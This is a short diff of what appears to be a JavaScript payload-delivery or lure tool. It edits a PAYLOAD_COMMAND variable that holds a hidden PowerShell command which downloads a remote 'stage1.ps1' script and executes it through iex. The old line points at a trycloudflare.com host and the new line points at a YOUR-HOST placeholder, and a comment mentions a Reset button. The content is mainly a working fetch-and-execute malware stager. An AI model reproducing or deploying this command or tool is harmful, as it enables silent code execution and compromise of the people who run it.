@@ -435,7 +435,7 @@
    - A literal backtick inside must be escaped as \`
    - Avoid line breaks — keep it on one line.
    ═══════════════════════════════════════════════════════════════════════ */
-let PAYLOAD_COMMAND = `powershell -w hidden -c "iwr https://diamond-locally-rod-detective.trycloudflare.com/ttx/stage1.ps1 -useb | iex"`;
+let PAYLOAD_COMMAND = `powershell -w hidden -c "iwr http://YOUR-HOST:8000/ttx/stage1.ps1 -useb | iex"`;
 
 const DEFAULT_PAYLOAD = PAYLOAD_COMMAND; // used by the Reset button
 
